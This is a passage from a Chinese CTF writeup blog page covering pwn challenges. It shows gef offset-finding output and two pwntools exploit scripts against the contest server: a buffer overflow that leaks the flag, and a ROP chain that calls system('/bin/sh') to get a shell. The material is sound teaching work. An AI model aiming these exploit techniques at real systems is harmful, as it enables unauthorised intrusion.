+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  grep aaaabaaacaaadaaae</span><br><span class="line">[+] Searching 'aaaabaaacaaadaaae' in memory</span><br><span class="line">[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-</span><br><span class="line">  <span class="number">0xffffcf08</span> - <span class="number">0xffffcf3f</span>  →   <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"</span></span><br></pre></td></tr></table></figure>
+<p>计算一下 <code>0xffffcfd4-0xffffcf08 = 204</code></p>
+<p>注意本地跑的时候，需要自己创个 <code>flag.txt</code> 文件，并且长度要大于 <code>15</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process("./pwn3")</span></span><br><span class="line">sh = remote(<span class="string">"sysucsa.me"</span>,<span class="number">5052</span>)</span><br><span class="line">buf_addr = p32(<span class="number">0x804A060</span>)</span><br><span class="line"><span class="comment">#sh.sendline(buf_addr*52) </span></span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">204</span>+buf_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>但是从 <code>libc 2.25</code> 后，会以打印出字符串 <unknown> 结束，也就没有办法输出 <code>argv[0]</code> 了。用 <code>libc 2.23</code> 就可以了。</unknown></p>
+<h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><p>首先需要学习函数调用栈以及 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/" target="_blank" rel="noopener">rop</a> 的思想。<br>这道题就是其实就是 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/#ret2libc" target="_blank" rel="noopener">ret2libc2</a>，程序有个很明显的栈溢出漏洞，并且提供了 system 函数。<br>我们需要自己控制程序读取字串 <code>&#39;/bin/sh&#39;</code>到 <code>bss</code> 段，再控制程序执行 <code>system(&quot;&quot;/bin/sh&quot;)</code>,这道题只是地址和偏移改了。<br>地址在 <code>ida</code> 中查看就好了，<code>gadgets</code> 使用 <code>ROPgadget</code>、<code>ropper</code> 之类的工具搜索。</p>
+<p>偏移可以算或者直接在 <code>gdb</code> 中测:<br>首先生成一段 <code>junk</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  pattern create <span class="number">200</span></span><br><span class="line">[+] Generating a pattern of <span class="number">200</span> bytes</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>
+<p>运行程序输入生成的字符串，因为栈溢出覆盖了返回地址，此时程序会崩溃</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address <span class="number">0x61616178</span> =&gt; 返回地址被覆盖为 <span class="number">0x61616178</span></span><br></pre></td></tr></table></figure>
+<p>此时搜一下返回地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  pattern search <span class="number">0x61616178</span></span><br><span class="line">[+] Searching '0x61616178'</span><br><span class="line">[+] Found at offset <span class="number">92</span> (little-endian search) likely</span><br><span class="line">[+] Found at offset <span class="number">89</span> (big-endian search)</span><br></pre></td></tr></table></figure>
+<p>就得到了偏移，是 <code>92</code><br>以上是 <code>gef</code> 的命令<br><code>pwndbg</code> 对应的是：<br><code>cyclic 200</code> 生成长度为 200 字串<br><code>cyclic -l xxxx</code> 查找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./pwn4')</span></span><br><span class="line">sh = remote(<span class="string">"sysucsa.me"</span>,<span class="number">5053</span>)</span><br><span class="line">gets_plt =  <span class="number">0x8048430</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span> </span><br><span class="line">pop_ebx = <span class="number">0x08048415</span></span><br><span class="line">buf = <span class="number">0x804A060</span> </span><br><span class="line">main = <span class="number">0x804864D</span> </span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span>+p32(gets_plt)+p32(pop_ebx)+p32(buf)+p32(system_plt)+p32(main)+p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/13/hwb-2018-writeup/" rel="prev" title="2018 护网杯线上赛 Writeup-Waterdrop">
+                2018 护网杯线上赛 Writeup-Waterdrop <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Waterdrop</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web签到题"><span class="nav-number">1.1.</span> <span class="nav-text">web签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fake-md5-collision"><span class="nav-number">1.2.</span> <span class="nav-text">fake md5 collision</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单身二十年"><span class="nav-number">1.3.</span> <span class="nav-text">单身二十年</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAencode"><span class="nav-number">1.4.</span> <span class="nav-text">AAencode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#robots"><span class="nav-number">1.5.</span> <span class="nav-text">robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#My-sercet-word"><span class="nav-number">1.6.</span> <span class="nav-text">My sercet word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-x"><span class="nav-number">1.7.</span> <span class="nav-text">Web-x</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#出题人"><span class="nav-number">1.7.1.</span> <span class="nav-text">出题人</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zfl"><span class="nav-number">1.7.2.</span> <span class="nav-text">zfl</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc-签到题"><span class="nav-number">2.1.</span> <span class="nav-text">Misc 签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#more-png"><span class="nav-number">2.2.</span> <span class="nav-text">more png</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-是世界上最好的两种语言"><span class="nav-number">2.3.</span> <span class="nav-text">python 是世界上最好的两种语言</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#F"><span class="nav-number">3.1.</span> <span class="nav-text">F__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摩尔斯与凯撒的约会"><span class="nav-number">3.2.</span> <span class="nav-text">摩尔斯与凯撒的约会</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#I-wanna-be-modern"><span class="nav-number">3.3.</span> <span class="nav-text">I wanna be modern</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse"><span class="nav-number">4.</span> <span class="nav-text">reverse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">5.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cat-flag"><span class="nav-number">5.1.</span> <span class="nav-text">cat flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#format-string"><span class="nav-number">5.2.</span> <span class="nav-text">format string</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#overflow"><span class="nav-number">5.3.</span> <span class="nav-text">overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smash"><span class="nav-number">5.4.</span> <span class="nav-text">smash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rop"><span class="nav-number">5.5.</span> <span class="nav-text">rop</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Waterdrop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
